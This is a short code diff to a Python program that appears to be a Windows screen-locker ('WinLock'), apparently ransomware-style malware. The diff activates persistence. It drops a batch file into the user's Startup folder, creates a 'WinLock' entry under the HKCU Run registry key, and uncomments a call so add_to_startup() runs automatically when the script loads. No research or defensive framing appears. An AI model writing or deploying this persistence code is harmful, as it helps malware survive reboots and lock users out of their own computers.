@@ -33,9 +33,12 @@ def add_to_startup(file_path=""):
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "project.bat", "w+") as bat_file:
         bat_file.write(r'%s\project.py' % file_path)
-    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',_winreg.KEY_SET_VALUE)
+    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run')
     _winreg.SetValueEx(key,'WinLock',1,_winreg.REG_SZ,r'%s\project.py' % file_path) 
     key.Close()
+
+
+add_to_startup()
 
 
 def copy(event=None):
@@ -79,7 +82,6 @@ def okey(event=None):
 def pkey(event=None):
     text = my_string.get()+'0'
     my_string.set(text)
-#add_to_startup()
 
 def uMad(event=None):
     return False
